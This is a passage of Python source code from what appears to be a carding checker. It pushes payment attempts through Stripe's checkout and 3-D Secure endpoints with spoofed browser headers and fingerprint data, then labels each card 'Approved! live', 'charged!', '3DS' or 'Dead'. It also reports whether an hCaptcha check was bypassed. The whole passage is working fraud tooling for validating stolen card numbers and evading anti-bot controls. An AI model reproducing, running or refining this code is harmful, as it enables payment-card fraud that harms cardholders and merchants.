            # Detect Stripe session integrity / confirm errors (only the specific message)
            if "error has occurred confirming" in msg.lower():
                # Enhanced diagnostics for session_error
                diag_parts = [f"mode={_session_mode}"]
                if _needs_email:
                    diag_parts.append("email")
                if _needs_phone:
                    diag_parts.append("phone")
                if _needs_billing_addr:
                    diag_parts.append("billing")
                if _needs_shipping:
                    diag_parts.append("shipping")
                if _update_ok is not None:
                    diag_parts.append(f"update={'ok' if _update_ok else 'fail'}")
                diag = ", ".join(diag_parts)
                return "Dead! ❌", f"Checkout Session Error [{diag}]", extra(decline_code="session_error", stripe_msg=msg)

            clean_msg, stype = _classify_decline(dcode, code, msg)
            dc_label = dcode or code or ""
            if stype == "live":
                return "Approved! ✅ -» live", clean_msg, extra(decline_code=dc_label, stripe_msg=msg)
            elif stype == "3ds":
                return "3DS 🔐", clean_msg, extra(decline_code=dc_label, stripe_msg=msg)
            else:
                return "Dead! ❌", clean_msg, extra(decline_code=dc_label, stripe_msg=msg)

        # ── Step 4: 3DS Authentication (FIX B — improved detection) ──
        # First check if payment_intent already succeeded (no 3DS needed)
        pi_obj = j3.get("payment_intent") or {}
        pi_status = pi_obj.get("status")
        if pi_status == "succeeded":
            return "Approved! ✅ -» charged!", "Payment Successful", extra(decline_code="charged", stripe_msg="Payment Successful")

        next_action = pi_obj.get("next_action") or {}
        next_action_type = next_action.get("type", "")
        use_sdk = next_action.get("use_stripe_sdk") or {}
        payatt = use_sdk.get("three_d_secure_2_source")
        servertrans = use_sdk.get("server_transaction_id")
        secret = pi_obj.get("client_secret")
        pi = pi_obj.get("id")

        # FIX B: Handle redirect_to_url 3DS flow (Stripe returns a redirect URL instead of SDK params)
        if next_action_type == "redirect_to_url" or next_action.get("redirect_to_url"):
            redirect_info = next_action.get("redirect_to_url") or {}
            redirect_url = redirect_info.get("url", "")
            return "3DS 🔐", "3DS Redirect Required", extra(
                decline_code="3ds_redirect",
                stripe_msg=f"3DS redirect: {redirect_url[:80]}" if redirect_url else "3DS Redirect Required",
            )

        if not pi:
            # No payment intent at all — classify from error
            err = (j3.get("error") or {})
            dcode = err.get("decline_code", "")
            code = err.get("code", "")
            msg = err.get("message", "Payment Failed")
            clean_msg, stype = _classify_decline(dcode, code, msg)
            dc_label = dcode or code or ""
            if stype == "live":
                return "Approved! ✅ -» live", clean_msg, extra(decline_code=dc_label, stripe_msg=msg)
            return "Dead! ❌", clean_msg, extra(decline_code=dc_label, stripe_msg=msg)

        if not payatt:
            # Has PI but no 3DS source — classify from error or report 3DS needed
            err = (j3.get("error") or {})
            dcode = err.get("decline_code", "")
            code = err.get("code", "")
            msg = err.get("message", "Payment Failed")
            clean_msg, stype = _classify_decline(dcode, code, msg)
            dc_label = dcode or code or ""
            if stype == "live":
                return "Approved! ✅ -» live", clean_msg, extra(decline_code=dc_label, stripe_msg=msg)
            # If next_action exists but no SDK params, it's likely a 3DS variant we can't handle
            if next_action and next_action_type:
                return "3DS 🔐", f"3DS Required ({next_action_type})", extra(
                    decline_code="3ds_unknown", stripe_msg=f"next_action type: {next_action_type}"
                )
            return "Dead! ❌", clean_msg, extra(decline_code=dc_label, stripe_msg=msg)

        # FIX B: Guard against server_transaction_id being None
        if not servertrans:
            # payatt exists but no server_transaction_id — skip 3DS authenticate, report 3DS required
            return "3DS 🔐", "3DS Required (no server transaction)", extra(
                decline_code="3ds_no_trans_id",
                stripe_msg="three_d_secure_2_source present but server_transaction_id missing",
            )

        enc_server = base64.b64encode(
            f'{{"threeDSServerTransID":"{servertrans}"}}'.encode()
        ).decode()

        auth_headers = {
            "accept": "application/json",
            "content-type": "application/x-www-form-urlencoded",
            "referer": "https://js.stripe.com/",
            "user-agent": ua,
            "origin": "https://js.stripe.com",
        }

        browser_json = (
            f'{{"fingerprintAttempted":true,"fingerprintData":"{enc_server}",'
            f'"challengeWindowSize":null,"threeDSCompInd":"Y","browserJavaEnabled":false,'
            f'"browserJavascriptEnabled":true,"browserLanguage":"",'
            f'"browserColorDepth":"{browser_color_depth}",'
            f'"browserScreenHeight":"{browser_screen_h}",'
            f'"browserScreenWidth":"{browser_screen_w}",'
            f'"browserTZ":"{browser_tz}","browserUserAgent":"{ua}"}}'
        )

        auth_data = {
            "source": payatt,
            "browser": browser_json,
            "one_click_authn_device_support[hosted]": "false",
            "one_click_authn_device_support[same_origin_frame]": "false",
            "one_click_authn_device_support[spc_eligible]": "true",
            "one_click_authn_device_support[webauthn_eligible]": "true",
            "one_click_authn_device_support[publickey_credentials_get_allowed]": "true",
            "key": pk_live,
        }

        try:
            r4 = await client.post(
                "https://api.stripe.com/v1/3ds2/authenticate",
                data=auth_data,
                headers=auth_headers,
            )
            j4 = r4.json()
        except Exception:
            j4 = {}

        if j4.get("state") == "challenge_required":
            return "3DS 🔐", "3DS Challenge Required", extra(decline_code="challenge_required", stripe_msg="3DS Challenge Required")

        # ── Final status check ──
        try:
            r5 = await client.get(
                f"https://api.stripe.com/v1/payment_intents/{pi}",
                params={"key": pk_live, "is_stripe_sdk": "false", "client_secret": secret},
                headers={
                    "accept": "application/json",
                    "content-type": "application/x-www-form-urlencoded",
                    "origin": "https://js.stripe.com",
                    "referer": "https://js.stripe.com/",
                    "user-agent": ua,
                },
            )
            j5 = r5.json()
            r5_text = r5.text
        except Exception:
            return "Dead! ❌", "Final status check failed", extra()

        final_status = j5.get("status")
        final_err = j5.get("last_payment_error") or {}
        final_msg = final_err.get("message", "")
        final_dcode = final_err.get("decline_code", "")
        final_code = final_err.get("code", "")
        error_msg = (j5.get("error") or {}).get("message", "")

        if final_status == "succeeded":
            return "Approved! ✅ -» charged!", "Payment Successful", extra(decline_code="charged", stripe_msg="Payment Successful")
        elif "verify_challenge" in r5_text:
            return "Dead! ❌", "HCAPTCHA Not Bypassed", extra()
        elif "authentication_challenge" in r5_text:
            return "Dead! ❌", "OTP Required", extra()
        elif "Unrecognized" in r5_text:
            return "Dead! ❌", "Unrecognized Request", extra()
        else:
            msg = final_msg or error_msg or "Payment Failed"
            clean_msg, stype = _classify_decline(final_dcode, final_code, msg)
            dc_label = final_dcode or final_code or ""
            if stype == "live":
                return "Approved! ✅ -» live", clean_msg, extra(decline_code=dc_label, stripe_msg=msg)
            elif stype == "3ds":
                return "3DS 🔐", clean_msg, extra(decline_code=dc_label, stripe_msg=msg)
            else:
                return "Dead! ❌", clean_msg, extra(decline_code=dc_label, stripe_msg=msg)
